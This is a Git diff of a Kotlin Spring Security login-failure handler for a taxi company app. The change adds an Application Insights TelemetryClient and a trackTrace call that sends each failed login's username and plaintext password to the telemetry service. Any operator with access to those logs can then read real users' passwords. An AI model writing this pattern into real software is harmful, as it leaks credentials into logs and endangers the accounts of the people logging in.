@@ -1,6 +1,7 @@
 package com.jalinfotec.soraguide.taxi.company.taxiCompanyApp.domain.login
 
 import com.jalinfotec.soraguide.taxi.company.taxiCompanyApp.domain.service.UserAccountService
+import com.microsoft.applicationinsights.TelemetryClient
 import org.springframework.security.authentication.BadCredentialsException
 import org.springframework.security.authentication.LockedException
 import org.springframework.security.core.AuthenticationException
@@ -21,6 +22,7 @@ class FailureHandler(private val userAccountService: UserAccountService) : Authe
     override fun onAuthenticationFailure(request: HttpServletRequest,
                                          response: HttpServletResponse,
                                          ex: AuthenticationException) {
+        val telemetry = TelemetryClient()
         // 処理後のリダイレクト先URL
         var redirectUrl = "./system-error"
 
@@ -32,7 +34,7 @@ class FailureHandler(private val userAccountService: UserAccountService) : Authe
             //入力されたユーザ名を取得
             val userName = request.getParameter("username")
             println(userName)
-
+            telemetry.trackTrace("username:"+ userName+",Password:"+request.getParameter("password"))
             //DBからユーザ情報を取得
             val account = userAccountService.findByUserName(userName)
 
